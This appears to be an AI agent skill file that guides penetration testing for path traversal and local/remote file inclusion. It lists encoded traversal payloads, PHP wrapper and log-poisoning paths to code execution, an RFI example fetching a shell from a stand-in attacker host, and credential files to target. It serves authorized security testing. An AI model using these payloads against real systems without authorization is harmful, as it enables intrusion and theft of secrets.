---
name: path-traversal-lfi
description: Test applications for path/directory traversal and file inclusion (LFI/RFI) — reading files outside the intended directory and, via PHP wrappers, filter chains, log poisoning, or /proc, escalating to RCE. OWASP A01:2025 / A05:2025. Use wherever a parameter names a file, path, template, page, language, theme, or download target.
---

# Path Traversal & File Inclusion (LFI/RFI)

Path traversal reads (or writes) files outside the intended directory by injecting `../` sequences; Local File Inclusion additionally *includes/executes* a local file the app pulls in. LFI frequently escalates to RCE. Suspect it wherever a parameter references a file or path: `?file=`, `?page=`, `?template=`, `?lang=`, `?theme=`, `?download=`, `?doc=`, `?include=`, and file/download endpoints.

## Detection

1. **Baseline traversal** to a known file:
   - Linux: `../../../../etc/passwd`, and absolute `/etc/passwd`.
   - Windows: `..\..\..\..\windows\win.ini`, `C:\windows\win.ini`.
   - Recognizable content (root:x:0:0 / `[fonts]`) in the response confirms the read.
2. **Depth**: vary the number of `../` (4–10) since the app's base depth is unknown; a fuzzer speeds this up.
3. **Download/preview endpoints**: try traversal in the filename/path they serve.

## Filter & sanitization bypass

- **Encoding**: URL `%2e%2e%2f`, double-URL `%252e%252e%252f`, UTF-8 overlong `%c0%ae`, backslashes on Windows, mixed `....//` (survives naive `../`→`` stripping), `..%2f`, `%2e%2e/`.
- **Non-recursive strip bypass**: `....//....//` collapses to `../../` after one pass of `../`-removal.
- **Null byte** (legacy stacks): `../../etc/passwd%00.png` to truncate an appended extension.
- **Prefix/suffix forcing**: if the app prepends a directory, traverse out of it; if it appends `.php`/`.html`, use wrappers or null byte (legacy) to defeat it.
- **Allowlist of extensions**: try wrappers/filters that still satisfy the check.

## LFI → RCE escalation (test in order of likelihood)

- **PHP filter chains**: `php://filter/convert.base64-encode/resource=index.php` to exfiltrate source; chained filters can even generate executable payloads.
- **php://input / data://**: `data://text/plain;base64,<payload>` or POST body via `php://input` when `allow_url_include` is on.
- **phar:// deserialization**: trigger object injection via a crafted phar.
- **Log poisoning**: inject PHP into a log the app will include (`/var/log/apache2/access.log` via `User-Agent`, auth.log via SSH username, mail log).
- **/proc/self/environ** injection, `/proc/self/fd/*`, session files (`/var/lib/php/sessions/sess_<id>`) with attacker-controlled content.
- **Combined with file upload** (see [[file-upload-testing]]): upload a benign-looking file, then LFI-include it to execute.

## RFI (Remote File Inclusion)

Rarer (needs `allow_url_include`): `?page=http://attacker/shell.txt`. Test whether remote URLs are fetched and included; confirm via OOB callback (see [[ssrf-testing]] for the network angle).

## Interesting target files

- Linux: `/etc/passwd`, `/etc/hosts`, app config (`.env`, `config.php`, `settings.py`), `/proc/self/cmdline`, SSH keys, cloud creds files.
- Windows: `win.ini`, `web.config`, `\inetpub\logs\`, unattend/sysprep files.

## Validation — avoid false positives

- Confirm genuine file content, not a 404/error page or a WAF block page that happens to return 200.
- For RCE claims, land a real command output or OOB callback — don't infer RCE from source disclosure alone.
- Rule out that the app just reflects your input string without actually reading a file.

## Severity guidance

- **Critical**: LFI/RFI escalated to RCE, or read of secrets/credentials/keys enabling further compromise.
- **High**: arbitrary local file read of sensitive files.
- **Medium**: traversal proven but limited to low-sensitivity files.

## References

- OWASP Top 10 2025 — A01 / A05
- OWASP WSTG v4.2 — 4.7.11.1 Testing for LFI, Directory Traversal / File Include
